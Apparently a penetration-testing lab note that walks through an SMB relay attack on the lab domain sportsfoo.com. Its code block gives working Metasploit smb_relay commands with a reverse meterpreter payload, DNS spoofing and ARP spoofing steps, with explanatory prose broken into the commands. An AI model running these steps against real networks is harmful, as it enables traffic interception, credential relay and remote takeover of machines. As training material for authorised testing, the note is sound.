# DNS & SMB Relay Attack

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 3990–4062. Examples are lab-specific and need verification.

Launch an attack using the **SMB Relay Exploit** in a way that once the Client (**172.16.5.5**) issues a **SMB** connection to any hosts on the ***.sportsfoo.com** domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (172.16.5.10**).

- graphic representation

    ![image.png](image%203.png)

    ![image.png](image%204.png)

You are hired by a small company to perform a security assessment. Your customer is **sportsfoo.com** and they want your help to test the security of their environment, according to the scope below:

**The assumptions of this security engagement are:**

1. You are going to do an internal penetration test, where you will be connected directly into their LAN network **172.16.5.0/24**. The scope in this test is only the **172.16.5.0/24** segment
2. You are in a production network, so you should not lock any user account by guessing their usernames and passwords

Goals:

- Exploitation using **SMB Relay Attack**
- Manipulating network traffic with **dnsspoof**

Tools: dnsspoof, msf

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit

#Configure
dnsspoof
in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain:
sportsfoo.com
. Create a file with fake dns entry with all subdomains of
sportsfoo.com
pointing to our attacker machine.

echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

//#Activate the
MiTM
attack using the
ARP Spoofing
technique. Our goal is to poison the traffic between our victim,
Windows 7
at
172.16.5.5
, and the default gateway at
172.16.5.1
. In this way, we can manipulate the traffic using
dnsspoof
, which is already running. In order to perform an
ARP Spoofing
attack, we need to enable the IP forwarding as follow://

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
dnsspoof -i eth1 -f dns

sessions
sessions -i 1
getuid
```

In this lab, we were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.
